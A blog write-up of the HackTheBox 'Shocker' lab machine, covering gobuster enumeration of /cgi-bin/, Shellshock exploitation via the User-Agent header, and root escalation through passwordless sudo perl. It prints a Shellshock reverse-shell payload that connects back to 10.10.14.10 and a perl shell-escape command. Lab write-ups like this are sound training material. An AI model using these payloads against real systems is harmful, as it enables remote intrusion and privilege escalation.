---
title: "Shocker"
date: 2023-06-24T23:12:03+02:00
tags: ["privesc","web","linux"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Shocker.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with Shellshock bash remote code execution vulnerability."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Shocker
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Shocker

![Untitled](/HTB/shocker-icon.png)

## Tools Used

- Nmap
- Gobuster
- Burpsuite

## Port Scanning

We can find two service up and running one web server in the port 80 and a ssh in port 2222

![Untitled](/HTB/shocker-1.png)

## Enumeration

If we visit the page we find a basic page with a basic html with only a picture.

![Untitled](/HTB/shocker-2.png)

![Untitled](/HTB/shocker-3.png)

When I tried to fuzz the directories of the website, I found that gobuster doesn’t found anything and after several tests i realized that the website only recognize directories adding “/” at the end of the URL.

![Untitled](/HTB/shocker-4.png)

![Untitled](/HTB/shocker-5.png)

Thanks to the error message of the website, it is observed that when no slash is added, a "not found" page is returned. In this example, the "cgi-bin" directory is tested. "cgi-bin" is specifically tested because the name of the machine gives a clue that it is likely vulnerable to the Shellshock Bash remote code execution vulnerability, which affects web servers utilizing CGI (Common Gateway Interface).

![Untitled](/HTB/shocker-6.png)

A quick fuzzing with the flag "-f" in Gobuster is performed, forcing the slash at the end of the URL. Three directories are discovered. Now, the "/cgi-bin/" directory is fuzzed to search for any interesting file such as .php, .py, .html, .js, or .sh. In this case, the "-f" flag is not used because files are being searched for.

![Untitled](/HTB/shocker-7.png)

We find a file named [user.sh](http://user.sh), lets open it

![Untitled](/HTB/shocker-8.png)

Upon opening it, it is revealed that the file is actually [test.sh](http://test.sh) file

Now let’s focus on the Shellshock vulnerability, the basis of this vuln is to edit the http request to modify the User-Agent to “() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.10/1234 0>&1” we can do that with burp and allows us with a listening port to have a reverse shell. 

I got all the information about Shellshock here: https://ethicalhackingguru.com/how-to-exploit-the-shellshock-vulnerability/

![Untitled](/HTB/shocker-9.png)

![Untitled](/HTB/shocker-10.png)

## Gaining an Initial Foothold

Once in the home of the pwned user shelly we can see a user.txt which has the flag

![Untitled](/HTB/shocker-11.png)

![Untitled](/HTB/shocker-12.png)

## Privilege Escalation

Now we are in let’s elevate privilege

![Untitled](/HTB/shocker-13.png)

We can see with the sudo -l that we can use perl with root privilegies without any password, let’s take this advantage to pawn the system.

If we check in [https://gtfobins.github.io/gtfobins/](https://gtfobins.github.io/gtfobins/perl/#sudo) we can use `sudo perl -e 'exec "/bin/sh";'` to escalate privilege.

![Untitled](/HTB/shocker-14.png)

![Untitled](/HTB/shocker-15.png)

## Lessons Learned

- What did you learn from the room?
    
    Now we have learned how to exploit the Shellshock vulnerability to gain remote code execution and how to use sudo permissions to escalate privileges.
    
- Were there any new tools or techniques used?
    
    The use of the flag -f in gobuster for directory fuzzing.

**Thank you for reading, and happy hacking! 😄**
